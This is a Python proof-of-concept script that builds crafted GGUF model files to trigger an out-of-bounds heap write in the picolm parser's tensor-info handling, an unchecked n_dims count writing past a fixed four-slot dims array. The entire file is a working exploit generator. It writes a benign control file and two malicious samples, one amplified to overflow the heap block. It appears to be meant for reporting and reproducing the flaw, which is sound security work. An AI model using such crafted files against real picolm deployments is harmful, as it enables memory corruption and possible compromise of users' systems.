#!/usr/bin/env python3
"""
make_poc.py — craft minimal GGUF samples for the picolm parse_gguf n_dims OOB write.

Target: RightNow-AI/picolm @ cf3f2dfca389e4f19a10dd36ce110c41ea12c899
Defect:  picolm/model.c:309-312 reads tensor-info n_dims (uint32, attacker
         controlled) and loops `tinfos[i].dims[d] = read_u64(&r)` with no bound
         check against the fixed `uint64_t dims[4]` declared at model.c:299.

Samples (GGUF v3, F32 "weights", tiny config so the CLI actually runs):
  benign.gguf      tensor 0 n_dims = 2, dims = [64, 128]              (in contract)
  evil_dims5.gguf  tensor 0 n_dims = 5, dims = [64, 128, 1, 1, 1]     (5th write into 4-slot array)
  evil_dims9.gguf  single tensor n_dims = 9                           (amplified: writes past
                                                                       the heap block -> ASan)
The two arms of the pair (benign / evil_dims5) are byte-identical except for the
n_dims field of tensor 0 and the number of trailing dim items, per the model
package construction contract. Tensor names and every other record are equal.
"""

import hashlib
import struct
import sys

GGUF_MAGIC = 0x46554747  # "GGUF" little-endian
GGUF_VERSION = 3
GGUF_TYPE_F32 = 0
ALIGNMENT = 32

N_EMBD = 64
VOCAB = 128


def gguf_str(s: bytes) -> bytes:
    return struct.pack("<Q", len(s)) + s


def kv_u32(key: str, val: int) -> bytes:
    # type 4 = GGUF_META_UINT32
    return gguf_str(key.encode()) + struct.pack("<I", 4) + struct.pack("<I", val)


def kv_str(key: str, val: str) -> bytes:
    # type 8 = GGUF_META_STRING
    return gguf_str(key.encode()) + struct.pack("<I", 8) + gguf_str(val.encode())


def tensor_info(name: str, n_dims: int, dims, ttype: int, offset: int) -> bytes:
    b = gguf_str(name.encode())
    b += struct.pack("<I", n_dims)
    for d in dims:
        b += struct.pack("<Q", d)
    b += struct.pack("<I", ttype)
    b += struct.pack("<Q", offset)
    return b


def build_gguf(tensors, payloads: dict) -> bytes:
    """tensors: list of (name, n_dims, dims, type, offset-as-assigned-later)."""
    metadata = b""
    metadata += kv_str("general.architecture", "llama")
    metadata += kv_u32("llama.embedding_length", N_EMBD)
    metadata += kv_u32("llama.feed_forward_length", 176)
    metadata += kv_u32("llama.attention.head_count", 8)
    metadata += kv_u32("llama.attention.head_count_kv", 8)
    metadata += kv_u32("llama.block_count", 0)
    metadata += kv_u32("llama.context_length", 512)
    metadata += kv_u32("llama.vocab_size", VOCAB)
    n_kv = 8

    header = struct.pack("<IIQQ", GGUF_MAGIC, GGUF_VERSION, len(tensors), n_kv)

    # First pass: size the tensor-info section so offsets into the data section
    # can be assigned in file order.
    infos_len = sum(
        8 + len(name.encode()) + 4 + 8 * len(dims) + 4 + 8
        for (name, _, dims, _, _) in tensors
    )
    data_base = len(header) + len(metadata) + infos_len
    data_base += (-data_base) % ALIGNMENT  # align up

    blob = b""
    infos = b""
    off = data_base
    for (name, n_dims, dims, ttype, _) in tensors:
        infos += tensor_info(name, n_dims, dims, ttype, off - data_base)
        payload = payloads[name]
        blob += payload
        off += len(payload)

    return header + metadata + infos + blob + b"\x00" * ALIGNMENT


def f32_payload(n: int) -> bytes:
    import math

    return b"".join(
        struct.pack("<f", 0.01 * math.sin(i)) for i in range(n)
    )


def main() -> None:
    token_embd = f32_payload(N_EMBD * VOCAB)      # 64 x 128 floats
    output_norm = f32_payload(N_EMBD)             # 64 floats

    samples = {
        # Negative control: legal 2-D tensor info.
        "benign.gguf": build_gguf(
            [
                ("token_embd.weight", 2, [N_EMBD, VOCAB], GGUF_TYPE_F32, 0),
                ("output_norm.weight", 1, [N_EMBD], GGUF_TYPE_F32, len(token_embd)),
            ],
            {"token_embd.weight": token_embd, "output_norm.weight": output_norm},
        ),
        # Positive: n_dims declared as 5 -> parser writes a 5th entry into the
        # fixed uint64_t dims[4] (picolm/model.c:311). Everything else equal.
        "evil_dims5.gguf": build_gguf(
            [
                ("token_embd.weight", 5, [N_EMBD, VOCAB, 1, 1, 1], GGUF_TYPE_F32, 0),
                ("output_norm.weight", 1, [N_EMBD], GGUF_TYPE_F32, len(token_embd)),
            ],
            {"token_embd.weight": token_embd, "output_norm.weight": output_norm},
        ),
        # Amplified variant of the same missing bound check: n_dims = 9 on the
        # only tensor makes the loop march past the end of the heap-allocated
        # tensor_info_t array (72-byte block) so AddressSanitizer can observe
        # the out-of-bounds WRITE directly.
        "evil_dims9.gguf": build_gguf(
            [
                ("token_embd.weight", 9,
                 [N_EMBD, VOCAB, 1, 1, 1, 1, 1, 1, 1], GGUF_TYPE_F32, 0),
            ],
            {"token_embd.weight": token_embd},
        ),
    }

    for fname, data in samples.items():
        with open(fname, "wb") as f:
            f.write(data)
        print(f"[+] {fname}  {len(data)} bytes  sha256="
              f"{hashlib.sha256(data).hexdigest()}")

    with open("SHA256SUMS.txt", "w") as f:
        for fname in samples:
            with open(fname, "rb") as fh:
                f.write(f"{hashlib.sha256(fh.read()).hexdigest()}  {fname}\n")
    print("[+] SHA256SUMS.txt written")


if __name__ == "__main__":
    sys.exit(main())
